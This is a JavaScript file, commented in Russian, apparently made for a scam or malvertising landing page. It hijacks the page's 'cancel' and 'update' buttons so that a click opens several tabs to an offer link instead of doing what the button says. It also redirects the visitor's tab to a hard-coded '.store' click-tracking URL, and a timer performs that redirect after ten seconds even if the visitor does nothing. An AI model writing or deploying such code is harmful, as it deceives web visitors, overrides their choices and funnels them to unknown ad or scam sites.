// Script for redirecting and opening URLs
(function() {
    // Configuration - можно изменить в index.html через data-атрибуты
    const DEFAULT_NEW_TABS_COUNT = 3; // Количество новых вкладок по умолчанию
    const DEFAULT_TIMEOUT_SECONDS = 10; // Время до редиректа в секундах
    const DEFAULT_REDIRECT_URL = 'https://winnerrrdinnerrrtoday.store/click?lp=1'; // URL для редиректа в текущей вкладке
    
    let actionTriggered = false;
    let timerTimeout = null;
    
    // Get configuration from HTML
    function getConfig() {
        const configElement = document.querySelector('[data-config]') || document.body;
        return {
            newTabsCount: parseInt(configElement.getAttribute('data-new-tabs-count')) || DEFAULT_NEW_TABS_COUNT,
            timeoutSeconds: parseInt(configElement.getAttribute('data-inactivity-seconds')) || DEFAULT_TIMEOUT_SECONDS,
            redirectUrl: configElement.getAttribute('data-redirect-url') || DEFAULT_REDIRECT_URL
        };
    }
    
    // Get offer link from buttons
    function getOfferLink() {
        const buttons = document.querySelectorAll('.cancel_btn, .update_btn');
        if (buttons.length > 0) {
            const firstButton = buttons[0];
            return firstButton.getAttribute('href') || DEFAULT_REDIRECT_URL;
        }
        return DEFAULT_REDIRECT_URL;
    }
    
    // Redirect function (simple redirect in current tab)
    function redirect() {
        if (actionTriggered) return; // Предотвращаем повторный вызов
        
        actionTriggered = true;
        const config = getConfig();
        
        // Просто редиректим в текущей вкладке
        window.location.href = config.redirectUrl;
    }
    
    // Open URLs on button click
    function openUrlsOnClick() {
        if (actionTriggered) return; // Предотвращаем повторный вызов
        
        actionTriggered = true;
        const config = getConfig();
        const offerLink = getOfferLink(); // Ссылка из кнопки (href)
        
        // Открываем N новых вкладок с URL из КНОПКИ (href кнопки) - СРАЗУ, синхронно
        for (let i = 0; i < config.newTabsCount; i++) {
            window.open(offerLink, '_blank');
        }
        
        // Затем редиректим текущую вкладку на указанный URL
        setTimeout(() => {
            window.location.href = config.redirectUrl;
        }, 50);
    }
    
    // Start simple timeout timer
    function startTimeout() {
        const config = getConfig();
        
        // Простой таймер - отсчитывает время с момента загрузки страницы
        // Без разницы, активен ли пользователь или нет
        timerTimeout = setTimeout(() => {
            if (!actionTriggered) {
                redirect();
            }
        }, config.timeoutSeconds * 1000);
    }
    
    // Handle button clicks
    function setupButtonHandlers() {
        const buttons = document.querySelectorAll('.cancel_btn, .update_btn');
        buttons.forEach(button => {
            button.addEventListener('click', function(e) {
                e.preventDefault();
                openUrlsOnClick();
            });
        });
    }
    
    // Initialize on page load
    document.addEventListener('DOMContentLoaded', function() {
        // Настраиваем обработчики кнопок
        setupButtonHandlers();
        
        // Запускаем простой таймер для редиректа
        startTimeout();
    });
    
    // Expose function globally if needed
    window.openUrls = openUrlsOnClick;
    window.redirect = redirect;
})();
